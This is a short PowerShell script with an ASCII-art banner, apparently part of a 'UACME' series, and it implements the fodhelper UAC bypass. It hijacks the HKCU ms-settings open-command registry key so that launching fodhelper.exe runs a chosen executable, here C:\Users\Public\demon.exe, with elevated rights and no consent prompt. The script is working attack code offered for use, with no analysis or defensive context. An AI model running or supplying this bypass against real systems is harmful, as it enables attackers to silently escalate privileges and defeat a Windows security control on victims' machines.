<# 
 .S       S.    .S_SSSs      sSSs   .S_SsS_S.    .S_SSSs    
.SS       SS.  .SS~SSSSS    d%%SP  .SS~S*S~SS.  .SS~SSSSS   
S%S       S%S  S%S   SSSS  d%S'    S%S `Y' S%S  S%S   SSSS  
S%S       S%S  S%S    S%S  S%S     S%S     S%S  S%S    S%S  
S&S       S&S  S%S SSSS%S  S&S     S%S     S%S  S%S SSSS%P  
S&S       S&S  S&S  SSS%S  S&S     S&S     S&S   &SSSSSSY   
S&S       S&S  S&S    S&S  S&S     S&S     S&S  S&S    S&S  
S&S       S&S  S&S    S&S  S&S     S&S     S&S  S&S    S&S  
S*b       d*S  S*S    S&S  S*b     S*S     S*S  S*S    S&S  
S*S.     .S*S  S*S    S*S  S*S.    S*S     S*S  S*S    S*S  
 SSSbs_sdSSS   S*S    S*S   SSSbs  S*S     S*S   *SSSSSSP   
  YSSP~YSSY    SSS    S*S    YSSP  SSS     S*S    *SSSsY    
                      SP                   SP             
                      Y                    Y               
                                                            
  sSSs    sSSs   .S_sSSs     .S    sSSs    sSSs             
 d%%SP   d%%SP  .SS~YS%%b   .SS   d%%SP   d%%SP             
d%S'    d%S'    S%S   `S%b  S%S  d%S'    d%S'               
S%|     S%S     S%S    S%S  S%S  S%S     S%|                
S&S     S&S     S%S    d*S  S&S  S&S     S&S                
Y&Ss    S&S_Ss  S&S   .S*S  S&S  S&S_Ss  Y&Ss               
`S&&S   S&S~SP  S&S_sdSSS   S&S  S&S~SP  `S&&S              
  `S*S  S&S     S&S~YSY%b   S&S  S&S       `S*S             
   l*S  S*b     S*S   `S%b  S*S  S*b        l*S             
  .S*P  S*S.    S*S    S%S  S*S  S*S.      .S*P             
sSS*S    SSSbs  S*S    S&S  S*S   SSSbs  sSS*S              
YSS'      YSSP  S*S    SSS  S*S    YSSP  YSS'               
                SP          SP                              
                Y           Y                               
                                
#>

$path = "C:\Users\Public\demon.exe" # We must change this to our Execution path
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value $path
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -PropertyType String -Value "" -Force | Out-Null
Start-Process "fodhelper.exe"
